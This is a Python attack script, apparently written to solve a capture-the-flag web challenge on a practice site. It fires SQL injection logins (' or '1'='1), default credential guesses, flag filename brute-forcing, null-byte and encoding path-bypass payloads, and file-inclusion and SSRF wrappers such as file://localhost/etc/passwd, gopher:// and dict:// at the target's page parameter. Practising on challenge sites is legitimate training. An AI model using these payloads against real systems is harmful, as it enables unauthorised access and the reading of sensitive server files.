#!/usr/bin/env python3
import requests
import base64
import hashlib

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] ULTIMATE SOLUTION ATTEMPT...")

# Sabemos que:
# 1. Login funciona, member/admin están vacíos
# 2. Hay "file path restrictions"
# 3. Se menciona "two-step authentication"
# 4. Los líderes son LuG[3]R, Fr[4]Ger, K[1]LLeR

# TEORÍA 1: La flag está en el mensaje de two-step
r = s.get(f"{base}index.php?page=login")
if 'flag' in r.text.lower():
    print(f"[!] Flag in login: {r.text}")

# TEORÍA 2: Necesito un login específico
leaders = [
    ("LuG[3]R", "LuG[3]R"),
    ("Fr[4]Ger", "Fr[4]Ger"),
    ("K[1]LLeR", "K[1]LLeR"),
    ("admin", "admin"),
    ("", ""),  # Empty
    ("' or '1'='1", "' or '1'='1"),
]

for user, pwd in leaders:
    # Login
    data = {'login': user, 'pass': pwd}
    r1 = s.post(f"{base}index.php?page=login", data=data)
    
    # Check member
    r2 = s.get(f"{base}index.php?page=member")
    if len(r2.text) > 1000:
        print(f"[!] Member with {user}:{pwd} = {len(r2.text)} bytes")
        if 'flag' in r2.text.lower():
            print(f"[!!!] FLAG: {r2.text}")

# TEORÍA 3: La flag está en un archivo con nombre específico
flag_names = [
    "theflag", "the_flag", "the-flag",
    "solution", "answer", "result",
    "w3challs", "challenge", "ctf",
    "vipwebarmy", "vip_web_army", "vip-web-army",
    ".flag", ".solution", ".answer",
    "FLAG", "Flag", "fLaG",
]

for name in flag_names:
    r = s.get(f"{base}index.php?page={name}")
    if len(r.text) != 736:
        print(f"[!] Found: {name} = {len(r.text)} bytes")

# TEORÍA 4: Necesito contactar primero y luego login
print("\n[*] Contact -> Login -> Member flow...")
s = requests.Session()

# Contact each leader
for i, leader in enumerate(["LuG[3]R", "Fr[4]Ger", "K[1]LLeR"], 1):
    # Contact
    data = {'recipient': str(i), 'msg': f'I want to join as {leader}'}
    r1 = s.post(f"{base}index.php?page=contact", data=data)
    
    # Login as that leader
    data = {'login': leader, 'pass': 'password'}
    r2 = s.post(f"{base}index.php?page=login", data=data)
    
    # Check member
    r3 = s.get(f"{base}index.php?page=member")
    if len(r3.text) > 1000:
        print(f"[!] After contacting {leader}: {len(r3.text)} bytes")

# TEORÍA 5: El path restriction bypass necesita un truco específico
print("\n[*] Advanced bypass attempts...")

# Tal vez necesito doble null byte o encoding específico
bypasses = [
    "member%00%00",
    "member%2500",
    "member\x00",
    "member%00.php%00",
    "%6d%65%6d%62%65%72",  # Hex encoding de member
    "member%",
    "member.",
    "member//",
    "member\\",
    "member#",
    "member?",
    "member;",
    "member&",
]

for bypass in bypasses:
    r = s.get(f"{base}index.php?page={bypass}")
    if len(r.text) not in [736, 1796]:
        print(f"[!] Bypass worked: {bypass} = {len(r.text)} bytes")

# TEORÍA 6: La flag está en el código fuente pero necesito un wrapper específico
print("\n[*] Trying alternative wrappers...")

wrappers = [
    "file://localhost/etc/passwd",
    "dict://localhost:11211/",
    "gopher://localhost:70/",
    "ftp://localhost/",
    "tftp://localhost/",
    "sftp://localhost/",
    "ldap://localhost/",
    "jar://test.jar!/",
]

for wrapper in wrappers:
    r = s.get(f"{base}index.php?page={wrapper}")
    if 'root:' in r.text or 'flag' in r.text.lower():
        print(f"[!] Wrapper worked: {wrapper}")

# TEORÍA 7: Hash o encoding de member/admin
print("\n[*] Testing hashes and encodings...")

for word in ["member", "admin", "flag"]:
    # MD5
    md5 = hashlib.md5(word.encode()).hexdigest()
    r = s.get(f"{base}index.php?page={md5}")
    if len(r.text) != 736:
        print(f"[!] MD5 of {word}: {md5} = {len(r.text)} bytes")
    
    # Base64
    b64 = base64.b64encode(word.encode()).decode()
    r = s.get(f"{base}index.php?page={b64}")
    if len(r.text) != 736:
        print(f"[!] Base64 of {word}: {b64} = {len(r.text)} bytes")
    
    # ROT13
    rot13 = word.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
    r = s.get(f"{base}index.php?page={rot13}")
    if len(r.text) != 736:
        print(f"[!] ROT13 of {word}: {rot13} = {len(r.text)} bytes")

print("\n[*] Done. If nothing worked, the challenge might be broken or require a very specific trick.")